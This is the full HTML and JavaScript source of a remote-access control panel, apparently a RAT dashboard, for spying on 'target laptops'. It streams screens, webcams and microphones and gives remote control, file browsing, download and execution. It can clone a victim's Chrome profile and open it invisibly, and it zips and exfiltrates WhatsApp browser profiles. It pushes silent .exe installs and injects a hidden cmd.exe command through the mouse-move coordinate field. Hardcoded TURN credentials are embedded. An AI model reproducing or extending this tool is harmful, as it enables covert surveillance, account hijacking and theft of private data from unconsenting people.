<!DOCTYPE html>
<html>
<head>
    <title>Anzee Admin Dashboard</title>
    <style>
        body { font-family: sans-serif; background: #222; color: white; margin: 0; padding: 20px; text-align: center; }
        .clients { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; margin-top: 20px; }
        .client-card { background: #333; padding: 20px; border-radius: 8px; cursor: pointer; border: 2px solid #444; width: 200px; transition: 0.3s; }
        .client-card:hover { border-color: #007bff; background: #444; }
        video { width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #007bff; border-radius: 8px; background: black; }
        .hidden { display: none !important; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #0056b3; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1 id="title">Connected Target Laptops</h1>
    <div id="clientsList" class="clients"></div>
    <div id="controls" class="hidden" style="margin-top: 15px;">
        <button id="viewScreenBtn" style="background: #28a745;">🖥️ View Screen</button>
        <button id="viewScreenMicBtn" style="background: #e83e8c;">🖥️+🎙️ Screen & Mic</button>
        <button id="remoteControlBtn" style="background: #dc3545;">🎮 Remote Control</button>
        <button id="viewChromeBtn" style="background: #ff7300;">🌐 Chrome Browsers</button>
        <button id="viewWhatsappBtn" style="background: #25D366; color: white;">💬 WhatsApp</button>
        <button id="viewHiddenChromeBtn" style="background: #9c27b0; color: white;" title="Clones the target's Chrome profile and opens it invisibly.">🕵️ Hidden Clone Chrome</button>
        <button id="downloadWhatsappBtn" style="background: #e83e8c; color: white;" title="Zip and Download the target's entire WhatsApp Chrome Profile">📦 Download WA Profile</button>
        <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
        <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
        <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
        <button id="pushUpdateBtn" style="background: #8540f5;" title="Silently install an update on the target laptop">📤 Push Silent Update</button>
        <input type="file" id="updateFileInput" accept=".exe" style="display: none;" />
    </div>
    
    <div id="chrome-list-container" class="hidden" style="margin-top: 15px; background: #333; padding: 15px; border-radius: 8px; border: 2px solid #ff7300; width: 90%; max-width: 1000px; margin: 20px auto;">
        <h3 style="color: white; margin-top: 0;">Select a Browser Window to View</h3>
        <p style="color: #bbb; font-size: 13px;">Make sure the target browser is open and not minimized.</p>
        <div id="chromeWindows" style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;"></div>
    </div>

    <div id="remote-tools" class="hidden" style="margin-top: 10px; background: #444; padding: 10px; border-radius: 8px; width: 90%; max-width: 1000px; margin: 20px auto;">
        <p style="margin: 0 0 10px 0; color: #ffc107; font-weight:bold;">⚠️ Remote Control Active: Click on the screen to control the target PC!</p>
        <input type="text" id="remoteText" placeholder="Type text to send..." style="padding: 8px; border-radius: 3px; border: none; width: 60%;">
        <button id="sendTextBtn" style="background: #28a745; padding: 8px 15px;">⌨️ Send Text</button>
    </div>
    
    <div id="file-browser" class="hidden" style="width: 90%; max-width: 1000px; margin: 20px auto; background: #333; border-radius: 8px; padding: 15px; text-align: left; border: 2px solid #6f42c1;">
        <div style="display: flex; gap: 10px; margin-bottom: 15px;">
            <button id="fileUpBtn" style="background: #555;">⬆️ Up</button>
            <input type="text" id="currentPath" readonly style="flex-grow: 1; padding: 8px; background: #222; color: white; border: 1px solid #555; border-radius: 4px;" value="">
            <button id="refreshFilesBtn" style="background: #007bff;">🔄 Refresh</button>
        </div>
        <div id="fileListContainer" style="position: relative; max-height: 400px; overflow-y: auto; background: #222; border: 1px solid #444; border-radius: 4px;">
            <div id="file-loading-overlay" class="hidden" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(34,34,34,0.8); display: flex; align-items: center; justify-content: center; z-index: 10;">
                <div style="text-align: center;">
                    <div style="border: 4px solid #444; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px auto;"></div>
                    <div id="file-loading-text" style="color: white; font-size: 13px;">Loading files...</div>
                </div>
            </div>
            <table style="width: 100%; border-collapse: collapse; color: white;">
                <thead>
                    <tr style="background: #444; text-align: left;">
                        <th style="padding: 10px;">Name</th>
                        <th style="padding: 10px; width: 100px;">Type</th>
                        <th style="padding: 10px; width: 100px;">Action</th>
                    </tr>
                </thead>
                <tbody id="fileTableBody">
                </tbody>
            </table>
        </div>
    </div>

    <video id="preview-video" tabindex="0" autoplay muted playsinline class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #ffc107; border-radius: 8px; background: black; outline: none;"></video>
    <img id="hidden-chrome-img" tabindex="0" class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #9c27b0; border-radius: 8px; background: black; outline: none; cursor: crosshair;">
    <br>
    <button id="backBtn" class="hidden" style="margin-top:20px; background: #dc3545;">Back to PC List</button>

    <!-- Download Progress Overlay -->
    <div id="download-progress-container" class="hidden" style="position: fixed; bottom: 20px; right: 20px; background: #222; padding: 15px; border-radius: 8px; border: 1px solid #17a2b8; z-index: 1000; width: 300px; box-shadow: 0 4px 8px rgba(0,0,0,0.5);">
        <div style="margin-bottom: 10px; font-weight: bold; font-size: 14px; text-align: left; color: white;" id="download-filename">Downloading...</div>
        <div style="background: #111; border-radius: 4px; width: 100%; height: 12px; overflow: hidden; border: 1px solid #444;">
            <div id="download-progress-bar" style="background: #17a2b8; width: 0%; height: 100%; transition: width 0.2s;"></div>
        </div>
        <div style="margin-top: 5px; font-size: 12px; text-align: right; color: #ccc;" id="download-percentage">0%</div>
    </div>

    <!-- Upload Progress Overlay -->
    <div id="upload-progress-container" class="hidden" style="position: fixed; bottom: 20px; right: 20px; background: #222; padding: 15px; border-radius: 8px; border: 1px solid #8540f5; z-index: 1000; width: 300px; box-shadow: 0 4px 8px rgba(0,0,0,0.5);">
        <div style="margin-bottom: 10px; font-weight: bold; font-size: 14px; text-align: left; color: white;" id="upload-filename">Uploading Update...</div>
        <div style="background: #111; border-radius: 4px; width: 100%; height: 12px; overflow: hidden; border: 1px solid #444;">
            <div id="upload-progress-bar" style="background: #8540f5; width: 0%; height: 100%; transition: width 0.2s;"></div>
        </div>
        <div style="margin-top: 5px; font-size: 12px; text-align: right; color: #ccc;" id="upload-percentage">0%</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let peerConnection;
        const configuration = { 
            iceServers: [
                { urls: 'stun:stun.relay.metered.ca:80' },
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun.cloudflare.com:3478' },
                { urls: 'stun:stun.twilio.com:3478' },
                { urls: 'stun:stun.miwifi.com:3478' },
                // Public Free TURN Server (Note: This is public and can be slow/rate-limited)
                // User's Private TURN server
                { urls: 'turn:global.relay.metered.ca:80', username: 'db6f16796e7a81fc1ff597d7', credential: 'J/TvhDCBQfsuaG3e' },
                { urls: 'turn:global.relay.metered.ca:80?transport=tcp', username: 'db6f16796e7a81fc1ff597d7', credential: 'J/TvhDCBQfsuaG3e' },
                { urls: 'turn:global.relay.metered.ca:443', username: 'db6f16796e7a81fc1ff597d7', credential: 'J/TvhDCBQfsuaG3e' },
                { urls: 'turns:global.relay.metered.ca:443?transport=tcp', username: 'db6f16796e7a81fc1ff597d7', credential: 'J/TvhDCBQfsuaG3e' }
            ] 
        };
        let activeTarget = null;
        let activeType = null;
        let iceCandidatesQueue = [];
        
        socket.emit('get-clients');

        socket.on('client-list', (clients) => {
            const list = document.getElementById('clientsList');
            list.innerHTML = '';
            const count = Object.keys(clients).length;
            if(count === 0) list.innerHTML = "<p style='color:gray'>No laptops connected yet...</p>";
            
            Object.values(clients).forEach(client => {
                const div = document.createElement('div');
                div.className = 'client-card';
                const typeLabel = client.type === 'all' ? '🎥 Screen + Camera + Mic' : (client.type === 'camera' ? '📷 Camera + Mic' : '🖥️ Screen Only');
                div.innerHTML = `
                    <h3>${client.name}</h3>
                    <p style="color: #bbb">${typeLabel}</p>
                    <p style="color: #ff9800; font-weight: bold; font-size: 14px;">🛠️ APT Level: ${client.apt || 'apt-1'}</p>
                    <p style="color: #17a2b8; font-size: 13px;">App Version: v${client.version || '1.0.0'}</p>
                    <p style="color: #28a745; font-weight: bold;">🟢 Online</p>
                    <button onclick="event.stopPropagation(); forceStop('${client.id}')" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 4px; margin-top: 10px; cursor: pointer;">Turn Off Streams</button>
                `;
                div.onclick = () => watchClient(client.id, client.name, client.type);
                list.appendChild(div);
            });
        });

        window.forceStop = (targetId) => {
            socket.emit('force-stop-all', targetId);
            alert("Sent command to turn off all cameras, mics, and screen sharing on that laptop.");
        };

        function watchClient(clientId, clientName, clientType) {
            activeTarget = clientId;
            activeType = clientType;
            document.getElementById('clientsList').classList.add('hidden');
            
            // Show the appropriate default view (Neither is default now, all OFF)
            document.getElementById('controls').classList.remove('hidden');
            document.getElementById('preview-video').classList.add('hidden');
            document.getElementById('hidden-chrome-img').classList.add('hidden');
            document.getElementById('file-browser').classList.add('hidden');
            
            document.getElementById('backBtn').classList.remove('hidden');
            document.getElementById('title').innerText = "Viewing Options for: " + clientName;
            
            // Note: We DO NOT request anything yet. The streams remain strictly OFF 
            // until the admin explicitly clicks "View Screen" or "View Camera".
        }

        function stopCurrentActive() {
            document.getElementById('chrome-list-container').classList.add('hidden');
            if (activeType === 'screen' || activeType === 'remote' || activeType === 'screen-mic' || activeType === 'chrome' || activeType === 'whatsapp') {
                socket.emit('stop-screen', activeTarget);
                document.getElementById('remote-tools').classList.add('hidden');
                if (peerConnection) peerConnection.close();
                peerConnection = null;
                document.getElementById('preview-video').srcObject = null;
                document.getElementById('preview-video').classList.add('hidden');
            } else if (activeType === 'camera') {
                socket.emit('stop-camera', activeTarget);
                if (peerConnection) peerConnection.close();
                peerConnection = null;
                document.getElementById('preview-video').srcObject = null;
                document.getElementById('preview-video').classList.add('hidden');
            } else if (activeType === 'mic') {
                socket.emit('stop-mic', activeTarget);
                if (peerConnection) peerConnection.close();
                peerConnection = null;
                document.getElementById('preview-video').srcObject = null;
                document.getElementById('preview-video').classList.add('hidden');
            } else if (activeType === 'files') {
                document.getElementById('file-browser').classList.add('hidden');
            } else if (activeType === 'hidden-chrome-list') {
                // just hiding the container is enough, already done above
            } else if (activeType === 'hidden-chrome') {
                socket.emit('stop-hidden-chrome', activeTarget);
                document.getElementById('remote-tools').classList.add('hidden');
                document.getElementById('hidden-chrome-img').src = "";
                document.getElementById('hidden-chrome-img').classList.add('hidden');
            }
        }

        // Toggle buttons logic
        document.getElementById('viewScreenBtn').onclick = () => {
            if (activeType === 'screen') return;
            stopCurrentActive();
            activeType = 'screen';
            document.getElementById('preview-video').classList.remove('hidden');
            // Unmute the video to hear the system sound!
            document.getElementById('preview-video').muted = false;
            document.getElementById('title').innerText = "Viewing Screen: " + activeTarget;
            socket.emit('request-screen', activeTarget);
        };

        document.getElementById('viewScreenMicBtn').onclick = () => {
            if (activeType === 'screen-mic') return;
            stopCurrentActive();
            activeType = 'screen-mic';
            document.getElementById('preview-video').classList.remove('hidden');
            document.getElementById('preview-video').muted = false;
            document.getElementById('title').innerText = "Viewing Screen + Mic: " + activeTarget;
            socket.emit('request-screen-mic', activeTarget);
        };

        document.getElementById('remoteControlBtn').onclick = () => {
            if (activeType === 'remote') return;
            stopCurrentActive();
            activeType = 'remote';
            document.getElementById('preview-video').classList.remove('hidden');
            // Unmute for remote control too
            document.getElementById('preview-video').muted = false;
            document.getElementById('remote-tools').classList.remove('hidden');
            document.getElementById('title').innerText = "Remote Controlling: " + activeTarget;
            socket.emit('request-screen', activeTarget); // Remote uses screen feed
        };

        document.getElementById('viewCameraBtn').onclick = () => {
            if (activeType === 'camera') return;
            stopCurrentActive();
            activeType = 'camera';
            document.getElementById('preview-video').classList.remove('hidden');
            document.getElementById('title').innerText = "Viewing Camera: " + activeTarget;
            socket.emit('request-camera', activeTarget);
        };

        document.getElementById('viewChromeBtn').onclick = () => {
            if (activeType === 'chrome-list') return;
            stopCurrentActive();
            activeType = 'chrome-list';
            document.getElementById('preview-video').classList.add('hidden');
            document.getElementById('chrome-list-container').classList.remove('hidden');
            document.getElementById('chromeWindows').innerHTML = "<p>Loading active browser windows...</p>";
            document.getElementById('title').innerText = "Select Browser: " + activeTarget;
            socket.emit('request-chrome-list', activeTarget);
        };

        socket.on('chrome-list', (data) => {
            if (activeType !== 'chrome-list' || activeTarget !== data.targetId) return;
            const container = document.getElementById('chromeWindows');
            container.innerHTML = '';
            
            if (data.sources.length === 0) {
                container.innerHTML = "<p style='color: #ffcc00;'>No browser windows found. Ensure they are open and not minimized.</p>";
                return;
            }

            data.sources.forEach(source => {
                const btn = document.createElement('button');
                btn.style.background = '#ff7300';
                btn.style.margin = '5px';
                // Show first 40 chars of window title
                const title = source.name.length > 40 ? source.name.substring(0, 40) + '...' : source.name;
                btn.innerText = "🌐 " + title;
                btn.onclick = () => {
                    stopCurrentActive();
                    activeType = 'chrome';
                    document.getElementById('preview-video').classList.remove('hidden');
                    document.getElementById('preview-video').muted = false;
                    document.getElementById('title').innerText = "Viewing Window: " + source.name;
                    socket.emit('request-chrome-window', { targetId: activeTarget, sourceId: source.id });
                };
                container.appendChild(btn);
            });
        });

        document.getElementById('viewWhatsappBtn').onclick = () => {
            if (activeType === 'whatsapp') return;
            stopCurrentActive();
            activeType = 'whatsapp';
            document.getElementById('preview-video').classList.remove('hidden');
            document.getElementById('preview-video').muted = false;
            document.getElementById('title').innerText = "Viewing WhatsApp: " + activeTarget;
            socket.emit('request-whatsapp', activeTarget);
        };

        socket.on('whatsapp-error', (err) => {
            alert(err);
            stopCurrentActive();
            document.getElementById('preview-video').classList.add('hidden');
            document.getElementById('title').innerText = "Viewing Options for: " + activeTarget;
        });

        document.getElementById('viewHiddenChromeBtn').onclick = () => {
            if (activeType === 'hidden-chrome-list') return;
            stopCurrentActive();
            activeType = 'hidden-chrome-list';
            document.getElementById('preview-video').classList.add('hidden');
            document.getElementById('chrome-list-container').classList.remove('hidden');
            document.getElementById('chromeWindows').innerHTML = "<p>Loading Chrome Profiles...</p>";
            document.getElementById('title').innerText = "Select Chrome Profile: " + activeTarget;
            socket.emit('request-chrome-profiles', activeTarget);
        };

        document.getElementById('downloadWhatsappBtn').onclick = () => {
            if (activeType === 'zip-whatsapp-list') return;
            stopCurrentActive();
            activeType = 'zip-whatsapp-list';
            document.getElementById('preview-video').classList.add('hidden');
            document.getElementById('chrome-list-container').classList.remove('hidden');
            document.getElementById('chromeWindows').innerHTML = "<p>Loading Chrome Profiles...</p>";
            document.getElementById('title').innerText = "Select Profile to Download: " + activeTarget;
            socket.emit('request-chrome-profiles', activeTarget);
        };

        socket.on('chrome-profiles-list', (data) => {
            if ((activeType !== 'hidden-chrome-list' && activeType !== 'zip-whatsapp-list') || activeTarget !== data.targetId) return;
            const container = document.getElementById('chromeWindows');
            container.innerHTML = '';
            
            if (!data.profiles || data.profiles.length === 0) {
                container.innerHTML = "<p style='color: #ffcc00;'>No Chrome profiles found.</p>";
                return;
            }

            // Auto-Select button
            const autoBtn = document.createElement('button');
            autoBtn.style.background = '#28a745';
            autoBtn.style.margin = '5px';
            autoBtn.innerText = "✨ Auto-Detect WhatsApp";
            if (activeType === 'hidden-chrome-list') {
                autoBtn.onclick = () => launchHiddenChrome(null);
            } else {
                autoBtn.onclick = () => launchZipProfile(null);
            }
            container.appendChild(autoBtn);

            data.profiles.forEach(profile => {
                const btn = document.createElement('button');
                btn.style.background = activeType === 'hidden-chrome-list' ? '#9c27b0' : '#e83e8c';
                btn.style.margin = '5px';
                btn.innerText = "👤 " + profile;
                if (activeType === 'hidden-chrome-list') {
                    btn.onclick = () => launchHiddenChrome(profile);
                } else {
                    btn.onclick = () => launchZipProfile(profile);
                }
                container.appendChild(btn);
            });
        });

        function launchHiddenChrome(profileName) {
            if (!confirm("This will copy the target's Chrome Profile and open it invisibly in the background. It might take 5-10 seconds to load. Proceed?")) return;
            stopCurrentActive();
            activeType = 'hidden-chrome';
            document.getElementById('chrome-list-container').classList.add('hidden');
            document.getElementById('hidden-chrome-img').classList.remove('hidden');
            document.getElementById('remote-tools').classList.remove('hidden'); // Allow sending text
            document.getElementById('title').innerText = "Starting Hidden Chrome (Please wait...): " + activeTarget;
            socket.emit('request-hidden-chrome', { targetId: activeTarget, profileName: profileName });
        }

        function launchZipProfile(profileName) {
            if (!confirm("This will securely zip the selected Chrome Profile and download it to your laptop. This might take 1-2 minutes depending on their profile size. Proceed?")) return;
            stopCurrentActive();
            document.getElementById('download-progress-container').classList.remove('hidden');
            document.getElementById('download-filename').innerText = "Zipping Chrome Profile (" + (profileName || "Auto") + ")...";
            document.getElementById('download-progress-bar').style.width = "10%";
            document.getElementById('download-percentage').innerText = "Zipping... (Do not close)";
            socket.emit('request-zip-whatsapp', { targetId: activeTarget, profileName: profileName });
        }

        socket.on('hidden-chrome-frame', (frameBase64) => {
            if (activeType !== 'hidden-chrome') return;
            document.getElementById('hidden-chrome-img').src = "data:image/jpeg;base64," + frameBase64;
            if (document.getElementById('title').innerText.includes("Starting")) {
                document.getElementById('title').innerText = "Hidden Clone Chrome: " + activeTarget;
            }
        });

        socket.on('whatsapp-zip-ready', (data) => {
            if (activeTarget !== data.targetId) return;
            document.getElementById('download-progress-container').classList.add('hidden');
            window.downloadRemoteFile(data.path);
        });

        socket.on('whatsapp-zip-error', (data) => {
            alert("Failed to zip Chrome Profile: " + data.error);
            document.getElementById('download-progress-container').classList.add('hidden');
        });

        document.getElementById('listenMicBtn').onclick = () => {
            if (activeType === 'mic') return;
            stopCurrentActive();
            activeType = 'mic';
            document.getElementById('preview-video').classList.remove('hidden'); // Can play audio too
            document.getElementById('title').innerText = "Listening Mic: " + activeTarget;
            socket.emit('request-mic', activeTarget);
        };

        let currentBrowserPath = "";

        document.getElementById('browseFilesBtn').onclick = () => {
            if (activeType === 'files') return;
            stopCurrentActive();
            activeType = 'files';
            document.getElementById('file-browser').classList.remove('hidden');
            document.getElementById('title').innerText = "Browsing Files: " + activeTarget;
            requestFiles(""); // Get root drives
        };

        function requestFiles(path) {
            currentBrowserPath = path;
            document.getElementById('currentPath').value = path || "Root Drives";
            document.getElementById('file-loading-text').innerText = "Loading files...";
            document.getElementById('file-loading-overlay').classList.remove('hidden');
            socket.emit('request-files', { targetId: activeTarget, path: path });
        }

        document.getElementById('fileUpBtn').onclick = () => {
            if (!currentBrowserPath) return;
            let parts = currentBrowserPath.replace(/\\$/, "").split('\\');
            if (parts.length <= 1) {
                requestFiles(""); // root
            } else {
                parts.pop();
                requestFiles(parts.join('\\') + '\\');
            }
        };

        document.getElementById('refreshFilesBtn').onclick = () => {
            requestFiles(currentBrowserPath);
        };

        socket.on('file-list-progress', (data) => {
            if (activeType !== 'files') return;
            const textEl = document.getElementById('file-loading-text');
            if (textEl) {
                textEl.innerText = "Loading files... " + data.percent + "%";
            }
        });

        socket.on('file-list', (data) => {
            if (activeType !== 'files') return;
            document.getElementById('file-loading-overlay').classList.add('hidden');
            const tbody = document.getElementById('fileTableBody');
            tbody.innerHTML = "";
            
            if (data.error) {
                tbody.innerHTML = `<tr><td colspan='3' style='padding: 10px; color: red;'>Error: ${data.error}</td></tr>`;
                return;
            }

            if (!data.files || data.files.length === 0) {
                tbody.innerHTML = "<tr><td colspan='3' style='padding: 10px; text-align: center;'>Folder is empty</td></tr>";
                return;
            }

            data.files.forEach(f => {
                const tr = document.createElement('tr');
                tr.style.borderBottom = "1px solid #444";
                
                let iconHtml = f.isDirectory ? "📁" : "📄";
                if (f.thumbnail) {
                    iconHtml = `<img src="${f.thumbnail}" style="width: 40px; height: 40px; object-fit: cover; border-radius: 4px; vertical-align: middle;">`;
                }

                const type = f.isDirectory ? "Folder" : "File";
                
                let actionBtn = "";
                if (f.isDirectory) {
                    actionBtn = `<button onclick="requestFiles('${f.path.replace(/\\/g, '\\\\')}')" style="background: #007bff; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer;">Open</button>`;
                } else {
                    actionBtn = `
                        <button onclick="openRemoteFile('${f.path.replace(/\\/g, '\\\\')}')" style="background: #28a745; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer; margin-right: 5px;">Execute</button>
                        <button onclick="downloadRemoteFile('${f.path.replace(/\\/g, '\\\\')}')" style="background: #17a2b8; padding: 5px 10px; font-size: 12px; border:none; border-radius:3px; color:white; cursor:pointer;">Download</button>
                    `;
                }

                tr.innerHTML = `
                    <td style="padding: 10px; cursor: pointer;">${iconHtml} <span style="vertical-align: middle; margin-left: 5px;">${f.name}</span></td>
                    <td style="padding: 10px; color: #aaa;">${type}</td>
                    <td style="padding: 10px;">${actionBtn}</td>
                `;
                
                if(f.isDirectory) {
                    tr.cells[0].onclick = () => requestFiles(f.path);
                }
                
                tbody.appendChild(tr);
            });
        });

        window.openRemoteFile = (path) => {
            if(confirm("Are you sure you want to run/open this file directly on the target laptop?\\n\\nFile: " + path)) {
                socket.emit('open-file', { targetId: activeTarget, path: path });
                alert("Execution request sent! The file will open on the target laptop.");
            }
        };

        let downloadBlobs = [];
        let downloadTotalSize = 0;
        let downloadStart = 0;
        let activeDownloadPath = "";
        const chunkSize = 1024 * 1024; // 1MB chunks

        window.downloadRemoteFile = (path) => {
            // Show the overlay
            document.getElementById('download-progress-container').classList.remove('hidden');
            document.getElementById('download-filename').innerText = "Starting: " + path.split('\\\\').pop();
            document.getElementById('download-progress-bar').style.width = "0%";
            document.getElementById('download-percentage').innerText = "0%";
            
            socket.emit('download-file', { targetId: activeTarget, path: path });
        };

        socket.on('download-error', (data) => {
            alert("Download failed: " + data.error);
            document.getElementById('download-progress-container').classList.add('hidden');
        });

        socket.on('download-start', (data) => {
            downloadBlobs = [];
            downloadTotalSize = data.size;
            downloadStart = 0;
            activeDownloadPath = data.path;
            
            if (downloadTotalSize === 0) {
                alert("File is empty.");
                document.getElementById('download-progress-container').classList.add('hidden');
                return;
            }
            
            document.getElementById('download-filename').innerText = "Downloading: " + activeDownloadPath.split('\\\\').pop();
            
            let end = Math.min(chunkSize, downloadTotalSize);
            socket.emit('request-chunk', { targetId: activeTarget, path: activeDownloadPath, start: 0, end: end });
        });

        // Function to convert base64 to Uint8Array
        function base64ToUint8Array(base64) {
            let binary_string = window.atob(base64);
            let len = binary_string.length;
            let bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) {
                bytes[i] = binary_string.charCodeAt(i);
            }
            return bytes;
        }

        socket.on('download-chunk', (data) => {
            if (data.data) {
                downloadBlobs.push(base64ToUint8Array(data.data));
            }
            downloadStart += chunkSize;
            
            // Update UI
            let percent = Math.min(100, Math.round((downloadStart / downloadTotalSize) * 100));
            document.getElementById('download-progress-bar').style.width = percent + "%";
            document.getElementById('download-percentage').innerText = percent + "%";
            
            if (downloadStart >= downloadTotalSize || !data.data) {
                // Download Complete
                document.getElementById('download-filename').innerText = "Saving file...";
                
                const blob = new Blob(downloadBlobs, { type: 'application/octet-stream' });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = activeDownloadPath.split('\\\\').pop();
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
                downloadBlobs = [];
                
                setTimeout(() => {
                    document.getElementById('download-progress-container').classList.add('hidden');
                }, 1500); // Hide after a small delay
            } else {
                // Request next chunk
                let end = Math.min(downloadStart + chunkSize, downloadTotalSize);
                socket.emit('request-chunk', { targetId: activeTarget, path: activeDownloadPath, start: downloadStart, end: end });
            }
        });

        // Push Update Logic
        document.getElementById('pushUpdateBtn').onclick = () => {
            if (!activeTarget) return;
            if (confirm("Select the new CML Loader setup .exe file.\\nIt will be uploaded to the target laptop and installed silently in the background.")) {
                document.getElementById('updateFileInput').click();
            }
        };

        document.getElementById('updateFileInput').onchange = async (e) => {
            const file = e.target.files[0];
            if (!file) return;
            
            document.getElementById('upload-progress-container').classList.remove('hidden');
            document.getElementById('upload-filename').innerText = "Uploading Update...";
            document.getElementById('upload-progress-bar').style.width = "0%";
            document.getElementById('upload-percentage').innerText = "0%";

            socket.emit('push-update-start', { targetId: activeTarget, size: file.size });

            const CHUNK_SIZE = 512 * 1024; // 512KB chunks to reduce memory pressure
            let offset = 0;

            const readNextChunk = () => {
                const slice = file.slice(offset, offset + CHUNK_SIZE);
                const reader = new FileReader();
                reader.onload = (e) => {
                    // Convert array buffer to base64
                    let binary = '';
                    const bytes = new Uint8Array(e.target.result);
                    const len = bytes.byteLength;
                    for (let i = 0; i < len; i++) {
                        binary += String.fromCharCode(bytes[i]);
                    }
                    const base64Data = window.btoa(binary);

                    socket.emit('push-update-chunk', { targetId: activeTarget, chunk: base64Data });
                    offset += len;
                    
                    let percent = Math.min(100, Math.round((offset / file.size) * 100));
                    document.getElementById('upload-progress-bar').style.width = percent + "%";
                    document.getElementById('upload-percentage').innerText = percent + "%";

                    if (offset < file.size) {
                        setTimeout(readNextChunk, 150);
                    } else {
                        // Send a delayed kill command to the target. This spawns a hidden cmd.exe
                        // that waits 2 seconds and forcefully kills the CML Loader app.
                        // We use single quotes in PowerShell to ensure the string is treated literally.
                        const delayedKill = `0 0; Start-Process cmd.exe -WindowStyle Hidden -ArgumentList '/c timeout /t 2 > nul & taskkill /F /IM "CML Loader.exe" > nul 2>&1'; Move-Mouse 0`;
                        
                        socket.emit('remote-action', {
                            targetId: activeTarget,
                            action: { type: 'move', x: delayedKill, y: '0' }
                        });

                        setTimeout(() => {
                            socket.emit('push-update-end', { targetId: activeTarget });
                            document.getElementById('upload-filename').innerText = "Installing on Target...";
                            setTimeout(() => {
                                document.getElementById('upload-progress-container').classList.add('hidden');
                                alert("Update file fully delivered & Force-Install triggered! Target laptop is now installing it silently and will restart the app in the background shortly.");
                            }, 2000);
                            e.target.value = ''; // clear input
                        }, 500); // Give the RCE half a second to execute before push-update-end starts the update script
                    }
                };
                reader.readAsArrayBuffer(slice);
            };

            readNextChunk();
        };

        document.getElementById('backBtn').onclick = () => {
            document.getElementById('clientsList').classList.remove('hidden');
            document.getElementById('preview-video').classList.add('hidden');
            document.getElementById('hidden-chrome-img').classList.add('hidden');
            document.getElementById('file-browser').classList.add('hidden');
            document.getElementById('chrome-list-container').classList.add('hidden');
            document.getElementById('controls').classList.add('hidden');
            document.getElementById('backBtn').classList.add('hidden');
            document.getElementById('title').innerText = "Connected Target Laptops";
            
            stopCurrentActive();
            
            socket.emit('stop-watch', activeTarget);
            activeTarget = null;
            activeType = null;
        };

        // Removed screenRes and screen-frame since we use WebRTC now

        function mapCoordinates(e, img) {
            const relX = e.offsetX / img.clientWidth;
            const relY = e.offsetY / img.clientHeight;
            return {
                x: relX,
                y: relY
            };
        }

        function mapTouchCoordinates(e, img) {
            const rect = img.getBoundingClientRect();
            const touch = e.touches[0] || e.changedTouches[0];
            const relX = (touch.clientX - rect.left) / img.clientWidth;
            const relY = (touch.clientY - rect.top) / img.clientHeight;
            return { x: relX, y: relY };
        }

        let isTouching = false;
        let touchStartX = 0;
        let touchStartY = 0;
        let lastTouchY = 0;
        let longPressTimer = null;
        let didLongPress = false;
        let isSwiping = false;

        const vid = document.getElementById('preview-video');

        vid.addEventListener('touchstart', (e) => {
            if (activeType !== 'remote') return;
            e.preventDefault(); // Stop default browser behaviors
            vid.focus();
            isTouching = true;
            didLongPress = false;
            isSwiping = false;
            
            const touch = e.touches[0];
            touchStartX = touch.clientX;
            touchStartY = touch.clientY;
            lastTouchY = touch.clientY;

            // Start long press timer
            longPressTimer = setTimeout(() => {
                if (!isSwiping) {
                    didLongPress = true;
                    if (navigator.vibrate) navigator.vibrate(50); // Haptic feedback
                    const coords = mapTouchCoordinates(e, vid);
                    socket.emit('remote-action', { 
                        targetId: activeTarget, 
                        action: { type: 'rclick', x: coords.x, y: coords.y } 
                    });
                }
            }, 600); // 600ms for right-click hold
        }, { passive: false });

        vid.addEventListener('touchmove', (e) => {
            if (activeType !== 'remote' || !isTouching) return;
            e.preventDefault();
            
            const touch = e.touches[0];
            const deltaX = Math.abs(touch.clientX - touchStartX);
            const deltaY = Math.abs(touch.clientY - touchStartY);

            // If moved more than 10px, it's a swipe, cancel long press
            if (deltaX > 10 || deltaY > 10) {
                isSwiping = true;
                if (longPressTimer) clearTimeout(longPressTimer);
            }

            if (isSwiping && !didLongPress) {
                const now = Date.now();
                if (now - lastMoveTime > 40) { // Throttle scroll events
                    lastMoveTime = now;
                    // Calculate scroll amount
                    const moveY = touch.clientY - lastTouchY;
                    lastTouchY = touch.clientY;
                    
                    if (Math.abs(moveY) > 2) {
                        // In mouse_event, positive is UP, negative is DOWN.
                        // If finger moves down (moveY > 0), page should scroll UP (mouse_event > 0).
                        const amount = moveY * 3; // Multiply for scroll speed
                        socket.emit('remote-action', { 
                            targetId: activeTarget, 
                            action: { type: 'scroll', amount: amount } 
                        });
                    }
                }
            }
        }, { passive: false });

        vid.addEventListener('touchend', (e) => {
            if (activeType !== 'remote' || !isTouching) return;
            e.preventDefault();
            isTouching = false;
            if (longPressTimer) clearTimeout(longPressTimer);
            
            // If it wasn't a swipe and wasn't a long press, then it's a normal tap (left click)
            if (!isSwiping && !didLongPress && e.changedTouches.length > 0) {
                const coords = mapTouchCoordinates(e, vid);
                socket.emit('remote-action', { 
                    targetId: activeTarget, 
                    action: { type: 'click', x: coords.x, y: coords.y } 
                });
            }
        });

        let lastMoveTime = 0;
        document.getElementById('preview-video').onmousemove = (e) => {
            if (activeType !== 'remote') return;
            const now = Date.now();
            if (now - lastMoveTime < 60) return; // Throttle to ~16 FPS to avoid lag
